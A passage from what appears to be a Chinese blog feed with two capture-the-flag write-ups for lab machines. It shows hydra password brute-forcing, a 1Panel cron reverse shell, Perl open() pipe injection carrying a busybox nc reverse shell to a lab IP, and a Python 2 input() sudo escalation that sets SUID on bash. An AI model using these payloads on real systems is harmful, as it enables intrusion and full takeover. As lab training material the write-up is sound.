404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.html                (Status: 403) [Size: 278]</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br><span class="line">/index.php            (Status: 200) [Size: 2016]</span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]</span><br><span class="line">/dashboard.php        (Status: 302) [Size: 0] [--&gt; index.php]</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br><span class="line">/.html                (Status: 403) [Size: 278]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]</span><br><span class="line">Progress: 830572 / 830576 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>没什么信息。</p>
<p>放一个 <strong>hydra</strong> 爆破密码在后台:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV -t 4 192.168.0.106 http-post-form <span class="string">&#x27;/:username=^USER^&amp;password=^PASS^:Something Error.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后我们先看看 38415 端口的web：</p>
<p><img src="image2.png" alt="image2"></p>
<p>说是暂时无法访问，目录扫描看看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.106:38415</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                   </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                   </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/HMV/pane1/reports/http_192.168.0.106_38415/_25-08-13_10-16-39.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.0.106:38415/</span><br><span class="line"></span><br><span class="line">[10:16:39] Starting:                                                                                                                                                               </span><br><span class="line">[10:17:01] 404 -   43B  - /assets/file                                      </span><br><span class="line">[10:17:01] 200 -  257B  - /assets/                                          </span><br><span class="line">[10:17:01] 301 -   43B  - /assets  -&gt;  /assets/</span><br><span class="line">[10:17:01] 404 -   43B  - /assets/fckeditor</span><br><span class="line">[10:17:01] 404 -   43B  - /assets/pubspec.yaml                              </span><br><span class="line">[10:17:01] 404 -   43B  - /assets/npm-debug.log</span><br><span class="line">[10:17:01] 404 -   43B  - /assets/js/fckeditor                              </span><br><span class="line">[10:17:11] 301 -   48B  - /favicon.ico  -&gt;  /favicon.ico/                   </span><br><span class="line">[10:17:13] 200 -    4B  - /health                                           </span><br><span class="line">[10:17:27] 301 -   43B  - /public  -&gt;  /public/                             </span><br><span class="line">[10:17:27] 200 -  117B  - /public/</span><br></pre></td></tr></table></figure>

<p>通过这些目录里的信息，确定后台是一个 <strong>1panel</strong> 的运维面板。</p>
<p>网上搜搜 <strong>1panel漏洞</strong> ，发现了一个 <strong>CVE-2025-54424</strong> 比较新，但是这个漏洞需要进行ssl连接，使用给出的 poc 发现总是连接失败，想必不是。</p>
<p>之后又搜了一下 <strong>1panel 默认用户名密码</strong>，但是也没有搜到什么有用的信息。</p>
<p>到这里，我感觉入口应该就是前面的那个登录页面，可能我的思路哪里有问题，准备再从 80 端口的登录页面入手。</p>
<p>这次，我采用 hydra 循环用户名爆破：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ hydra -L /usr/share/wordlists/fuzzDicts/userNameDict/top500.txt -P /usr/share/wordlists/rockyou.txt -vV -t 4 192.168.0.106 http-post-form <span class="string">&#x27;/:username=^USER^&amp;password=^PASS^:Something Error.&#x27;</span> -u -I</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-13 11:19:03</span><br><span class="line">[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 7344332288 login tries (l:512/p:14344399), ~1836083072 tries per task</span><br><span class="line">[DATA] attacking http-post-form://192.168.0.106:80/:username=^USER^&amp;password=^PASS^:Something Error.</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving <span class="keyword">done</span></span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;admin&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 1 of 7344332288 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;test&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 2 of 7344332288 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;test01&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 3 of 7344332288 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;test1&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 4 of 7344332288 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;test2&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 5 of 7344332288 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;weblogic&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 6 of 7344332288 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;ftp&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 7 of 7344332288 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;manager&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 8 of 7344332288 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;manage&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 9 of 7344332288 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;user&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 10 of 7344332288 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;guest&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 11 of 7344332288 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;administrator&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 12 of 7344332288 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;account&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 13 of 7344332288 [child 1] (0/0)</span><br><span class="line">[VERBOSE] Page redirected to http[s]://192.168.0.106:80/dashboard.php</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;super&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 14 of 7344332288 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;superuser&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 15 of 7344332288 [child 2] (0/0)</span><br><span class="line">[80][http-post-form] host: 192.168.0.106   login: administrator   password: 123456</span><br></pre></td></tr></table></figure>

<p>发现了一个有效凭据 <code>administrator:123456</code> ，原来用户名不是 admin，而是administrator。。。</p>
<p>那就用这个用户名密码登录：</p>
<p><img src="image3.png" alt="image3"></p>
<p>进去之后发现有个流量包，下载下来，拿wireshark看一下，发现里面有几条用用户名密码登录的数据：</p>
<p><img src="image4.png" alt="image4"></p>
<p>登录的目的网站就是我们所在的这个网站，因此我又尝试了重新用这些凭据去登录，但是都没法登录（我以为用这些凭据登录之后会有不一样的功能……）。</p>
<p>然后仔细看看我前面登录后的页面，发现在 <strong>“服务状态”</strong> 这里，有个 <strong>1Panel 122b059247</strong> :</p>
<p><img src="image5.png" alt="image5"></p>
<p>想到前面 38415 端口说会有个安全登录的入口，想必这个 <strong>122b059247</strong> 就是那个路径，去访问一下：</p>
<p><img src="image6.png" alt="image6"></p>
<p>是个 1Panel 的登录页面，尝试用前面数据包里发现的用户名密码去登录，发现 <code>root:superpassword123</code> 可以登录进去：</p>
<p><img src="image7.png" alt="image7.png"></p>
<p>然后发现可以添加计划任务，添加一个反弹shell的计划任务：</p>
<p><img src="image8.png" alt="image8"></p>
<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>执行之后，shell 就弹回来了，发现直接就是 root：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.0.106 54328</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">root@Pane1:/opt/1panel/task/shell/test# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@Pane1:/opt/1panel/task/shell/test#</span><br></pre></td></tr></table></figure>

<p>拿 user flag 和 root flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Pane1:/home/kaada# <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">flag&#123;user-ef68ba312de0daa3dd200a3f9275a6f6&#125;</span><br><span class="line">root@Pane1:/home/kaada# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;root-e07910a06a086c83ba41827aa00b26ed&#125;</span><br><span class="line">root@Pane1:/home/kaada# </span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Maze-Sec</tag>
        <tag>1Panle</tag>
      </tags>
  </entry>
  <entry>
    <title>MazeSec-Per1</title>
    <url>/2025/08/09/MazeSec-Per1/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- 192.168.0.107</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 00:31 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.107</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: E6:F4:83:79:2E:CF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.38 seconds</span><br></pre></td></tr></table></figure>

<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>​	开了80和22端口，查看web页面：</p>
<p><img src="image1.png" alt="image1"></p>
<p>​	页面是说，perl是个很优美的编程语言，并且举了一个perl代码的例子，但没有看到别的进一步渗透的信息。</p>
<p>​	那就查看一下源码，发现有一个很特别的提示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- cgi --&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	看到这个<strong>cgi</strong>，很自然就想到cgi-bin这个目录，再通过询问GPT，了解到perl语言如果写cgi脚本，一般文件后缀为cgi、pl，那就拿这两个后缀名爆破一下web页面的cgi-bin目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gobuster <span class="built_in">dir</span>  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://192.168.0.107/cgi-bin -x cgi,pl</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.0.107/cgi-bin</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              cgi,pl</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/file.cgi             (Status: 200) [Size: 22]</span><br></pre></td></tr></table></figure>

<p>​	发现有个file.cgi文件，去访问：</p>
<p><img src="image2.png" alt="image2"></p>
<p>​	他说缺少file参数，想必是个读文件的cgi，那就给他&#x2F;etc&#x2F;passwd，为了方便，采用curl：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">sunset:x:1001:1001:,,,:/home/sunset:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	可以看到返回了&#x2F;etc&#x2F;passwd的内容，而且有个sunset用户是有home目录的。</p>
<p>​	那接下来，可以尝试读取sunset的.bash_history、.ssh&#x2F;id_rsa，但都没有结果。</p>
<p>​	下一步的思路，我是想看看file.cgi这个文件本身的内容是什么，因此我得知道这个cgi-bin目录的确切路径才行。</p>
<p>​	询问GPT，“perl写的cgi文件一般在linux的哪个目录下？”，GPT回答说在 <strong>&#x2F;var&#x2F;www&#x2F;cgi-bin</strong> 或者 <strong>&#x2F;usr&#x2F;lib&#x2F;cgi-bin</strong>，两个都尝试访问，发现file.cgi是在&#x2F;usr&#x2F;lib&#x2F;cgi-bin之下，查看内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=/usr/lib/cgi-bin/file.cgi&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line">use CGI;</span><br><span class="line"><span class="built_in">print</span> CGI::header();</span><br><span class="line">my <span class="variable">$input</span> = CGI::param(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$input</span>) &#123;</span><br><span class="line">    open(FILE, <span class="variable">$input</span>);</span><br><span class="line">    <span class="built_in">print</span> <span class="keyword">while</span> &lt;FILE&gt;;</span><br><span class="line">    close(FILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Missing file parameter&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	由于接触perl不多，上述源代码看上去也没有直接的可利用的地方，我就询问了GPT，问他这个代码有没有危险的地方，他说 <strong>“如果文件名包含管道符 <code>｜</code>或反引号<code>`</code>，perl的open函数可以执行命令，例如：”</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.107/cgi-bin/file.cgi?file=|id|</span><br></pre></td></tr></table></figure>

<p>​	尝试进行命令执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=|id|&#x27;</span> </span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>

<p>​	可以看到执行了id命令，那就进行反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=|busybox nc 192.168.0.104 1234 -e /bin/bash|&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>​	成功反弹了shell，用python3稍微提升一下交互性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.0.107 45342</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www-data@Per1:/usr/lib/cgi-bin$ </span><br></pre></td></tr></table></figure>

<p>​	在&#x2F;home&#x2F;sunset里找到了user flag:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag&#123;user-5b5b8e9b01ef27a1cc0a2d5fa87d7190&#125;</span><br></pre></td></tr></table></figure>

<p>​	可以常规地在var、opt、home等目录里面找找信息，也可以找一下sunset这个用户的一些文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user sunset 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/opt/password.pl</span><br></pre></td></tr></table></figure>

<p>​	可以找到那个password.pl文件，ls看一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -liah /opt/password.pl</span><br><span class="line"></span><br><span class="line">784900 -rwxr-xr-x 1 sunset sunset 893 Aug  8 09:07 password.pl</span><br></pre></td></tr></table></figure>

<p>​	是sunset拥有的文件，且该文件我们有读取权限，读一下它：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> <span class="variable">@char_generator</span> = (</span><br><span class="line">    </span><br><span class="line">    [<span class="number">103</span>, <span class="number">3</span>],    </span><br><span class="line">    [<span class="number">126</span>, <span class="number">5</span>],    </span><br><span class="line">    [<span class="number">115</span>, <span class="number">7</span>],    </span><br><span class="line">    [<span class="number">98</span>,  <span class="number">1</span>],    </span><br><span class="line">    [<span class="number">112</span>, <span class="number">2</span>],    </span><br><span class="line">    [<span class="number">58</span>,  <span class="number">6</span>],    </span><br><span class="line">    [<span class="number">105</span>, <span class="number">4</span>],    </span><br><span class="line">    [<span class="number">122</span>, <span class="number">4</span>],    </span><br><span class="line">    [<span class="number">102</span>, <span class="number">5</span>]     </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">@decoy_blocks</span> = (</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">66</span>, <span class="number">71</span>, <span class="number">77</span>], <span class="string">offsets =&gt;</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">85</span>, <span class="number">90</span>, <span class="number">95</span>], <span class="string">offsets =&gt;</span> [<span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>], <span class="string">offsets =&gt;</span> [<span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>]&#125;  </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">my</span> <span class="variable">$i</span> (<span class="number">0</span>..<span class="number">4</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">my</span> (<span class="variable">$val</span>, <span class="variable">$off</span>) = @&#123;<span class="variable">$char_generator</span>[<span class="variable">$i</span>]&#125;;</span><br><span class="line">        <span class="variable">$output</span> .= <span class="keyword">chr</span>(<span class="variable">$val</span> - <span class="variable">$off</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">my</span> <span class="variable">$noise</span> = <span class="variable">$decoy_blocks</span>[<span class="number">0</span>]<span class="string">&#123;values&#125;</span>[<span class="number">0</span>] - <span class="variable">$decoy_blocks</span>[<span class="number">0</span>]<span class="string">&#123;offsets&#125;</span>[<span class="number">0</span>];</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">my</span> <span class="variable">$j</span> ((<span class="variable">$i</span> == <span class="number">3</span>) ? (<span class="number">3</span>..<span class="number">5</span>) : (<span class="number">6</span>..<span class="number">8</span>)) &#123;</span><br><span class="line">            <span class="keyword">my</span> (<span class="variable">$val</span>, <span class="variable">$off</span>) = @&#123;<span class="variable">$char_generator</span>[<span class="variable">$j</span>]&#125;;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="keyword">chr</span>(<span class="variable">$val</span> - <span class="variable">$off</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">last</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$output</span> . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​	看上去是个perl的代码，简单看一下内容也可以知道，他是在用一些简单的加密的方式输出一个密码，那就干脆找个在线的perl代码运行的网站运行一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.w3cschool.cn/tryrun/runcode?lang=perl5</span><br></pre></td></tr></table></figure>

<p>​	<img src="image3.png" alt="image3"></p>
<p>​	运行的结果是dylan4，这应该就是sunset的密码，切换用户（或者ssh连接）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Per1:/opt$ su sunset</span><br><span class="line">su sunset</span><br><span class="line">Password: dylan4</span><br><span class="line"></span><br><span class="line">sunset@Per1:/opt$</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>​	sudo -l，发现sunset用户可以执行一个python文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> sunset on Per1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User sunset may run the following commands on Per1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python /usr/bin/guess_game.py</span><br></pre></td></tr></table></figure>

<p>​	看一下guess_game.py的内容:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_game</span>():</span><br><span class="line">    ans = random.randint(<span class="number">0</span>, <span class="number">65535</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Welcome to the guess game!&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;I&#x27;ve chosen a number between 0 and 65535.&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_input = <span class="built_in">input</span>(<span class="string">&quot;Your guess: &quot;</span>)  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error:&quot;</span>, e</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_input == ans:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Congratulations! You guessed it.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Wrong! The correct number was&quot;</span>, ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    guess_game()</span><br></pre></td></tr></table></figure>

<p>​	可以看到是个python2的代码，对于这里的漏洞不太熟悉的朋友，可以问问GPT，当然也可以自己运行看一下。</p>
<p>​	例如，运行之后，我随便输入了一点东西：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to the guess game!</span><br><span class="line">I&#x27;ve chosen a number between 0 and 65535.</span><br><span class="line">Your guess: asd</span><br><span class="line">asd</span><br><span class="line">Error: name &#x27;asd&#x27; is not defined</span><br></pre></td></tr></table></figure>

<p>​	我输入了“asd”，他说” ‘asd’ is not defined”，这里用脚后跟想都绝对有问题，他没有把我的输入当成纯字符串处理，而是当成一个python代码来看。</p>
<p>​	那根据源码，他要比较我输入的东西和<em>ans</em>是否相等，那我就输入ans看一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to the guess game!</span><br><span class="line">I&#x27;ve chosen a number between 0 and 65535.</span><br><span class="line">Your guess: ans</span><br><span class="line">ans</span><br><span class="line">Congratulations! You guessed it.</span><br></pre></td></tr></table></figure>

<p>​	果然，他说我猜对了，那就说明这里应该可以进行命令执行。</p>
<p>​	引入os，执行系统命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/bin/python /usr/bin/guess_game.py</span><br><span class="line"></span><br><span class="line">Welcome to the guess game!</span><br><span class="line">I<span class="string">&#x27;ve chosen a number between 0 and 65535.</span></span><br><span class="line"><span class="string">Your guess: __import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span><span class="built_in">chmod</span> +s /bin/bash<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span><span class="built_in">chmod</span> +s /bin/bash<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">Wrong! The correct number was 39444</span></span><br></pre></td></tr></table></figure>

<p>​	查看&#x2F;bin&#x2F;bash的权限情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line"></span><br><span class="line">263242 -rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash</span><br></pre></td></tr></table></figure>

<p>​	可以看到已经加了s权限，用&#x2F;bin&#x2F;bash -p提权就好了：</p>
